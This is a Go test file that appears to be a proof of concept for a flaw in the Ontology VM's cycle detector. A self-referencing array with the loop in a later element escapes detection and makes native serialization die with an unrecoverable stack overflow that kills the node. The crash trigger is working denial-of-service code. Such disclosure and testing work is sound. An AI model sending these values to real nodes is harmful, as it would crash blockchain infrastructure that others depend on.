package types

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"testing"

	"github.com/ontio/ontology/common"
)

// buildFalseSelfArray builds the exact malicious PoC shape: A = [false, A].
// A safe primitive sits at index 0; the self-reference is a LATER child.
func buildFalseSelfArray() VmValue {
	arr := NewArrayValue()
	if err := arr.Append(VmValueFromBool(false)); err != nil {
		panic(err)
	}
	self := VmValueFromArrayVal(arr)
	if err := arr.Append(self); err != nil { // arr.Data = [false, self]
		panic(err)
	}
	return self
}

// buildSelfAtZeroArray builds A = [A] — cycle at the FIRST child (what the
// existing test suite already covers).
func buildSelfAtZeroArray() VmValue {
	arr := NewArrayValue()
	self := VmValueFromArrayVal(arr)
	if err := arr.Append(self); err != nil { // arr.Data = [self]
		panic(err)
	}
	return self
}

// PROOF 1: the detector MISSES the later-child cycle but CATCHES the child-0
// cycle. This is the blind spot, executed directly.
func TestFreshProof_DetectorBlindSpot(t *testing.T) {
	// malicious [false, self]: detector must (buggily) report NO cycle
	mal := buildFalseSelfArray()
	got, err := mal.CircularRefAndDepthDetection()
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if got != false {
		t.Fatalf("detector caught the later-child cycle (bug would be fixed); got=%v", got)
	}
	t.Logf("[false, self]  -> detector reports cycle = %v  (BLIND SPOT: cycle missed)", got)

	// control [self]: detector correctly reports a cycle
	ctrl := buildSelfAtZeroArray()
	gotCtrl, err := ctrl.CircularRefAndDepthDetection()
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if gotCtrl != true {
		t.Fatalf("detector missed the child-0 cycle too; got=%v", gotCtrl)
	}
	t.Logf("[self]         -> detector reports cycle = %v  (control: caught)", gotCtrl)
}

// PROOF 2 + 3: BuildParamToNative on [false, self] dies with a real, fresh
// `fatal error: stack overflow`, and a deferred recover() CANNOT save it.
// The crash runs in a re-exec'd child; the parent asserts on its output.
func TestFreshProof_NativeSerializeStackOverflow(t *testing.T) {
	if os.Getenv("FRESHPROOF_CRASH_CHILD") == "1" {
		// This deferred recover proves the throw is UNRECOVERABLE. For an
		// ordinary panic we would print RECOVERED and exit 0; for a runtime
		// stack-overflow throw we never get here — the process just dies.
		defer func() {
			if r := recover(); r != nil {
				fmt.Fprintf(os.Stderr, "RECOVERED=%v\n", r)
				os.Exit(0)
			}
		}()

		self := buildFalseSelfArray()
		reportsCycle, _ := self.CircularRefAndDepthDetection()
		fmt.Fprintf(os.Stderr, "child_detector_reports_cycle=%v\n", reportsCycle)

		sink := common.NewZeroCopySink(nil)
		fmt.Fprintln(os.Stderr, "child_calling_BuildParamToNative")
		_ = self.BuildParamToNative(sink) // <- fatal error: stack overflow
		fmt.Fprintln(os.Stderr, "NO_CRASH_returned_normally")
		os.Exit(0)
	}

	cmd := exec.Command(os.Args[0], "-test.run=TestFreshProof_NativeSerializeStackOverflow", "-test.v")
	cmd.Env = append(os.Environ(), "FRESHPROOF_CRASH_CHILD=1")
	out, _ := cmd.CombinedOutput()
	t.Logf("=== child process output (truncated) ===\n%s", head(out, 1800))

	if bytes.Contains(out, []byte("RECOVERED=")) {
		t.Fatalf("recover() caught it -> would NOT be a fatal node kill")
	}
	if bytes.Contains(out, []byte("NO_CRASH_returned_normally")) {
		t.Fatalf("BuildParamToNative returned normally -> no crash")
	}
	if !bytes.Contains(out, []byte("fatal error: stack overflow")) {
		t.Fatalf("expected `fatal error: stack overflow`, did not find it")
	}
	if !bytes.Contains(out, []byte("child_detector_reports_cycle=false")) {
		t.Fatalf("expected detector to report NO cycle in child")
	}
	t.Log("CONFIRMED: fatal error: stack overflow, not recovered, detector reported no cycle")
}

func head(b []byte, n int) []byte {
	if len(b) <= n {
		return b
	}
	return b[:n]
}
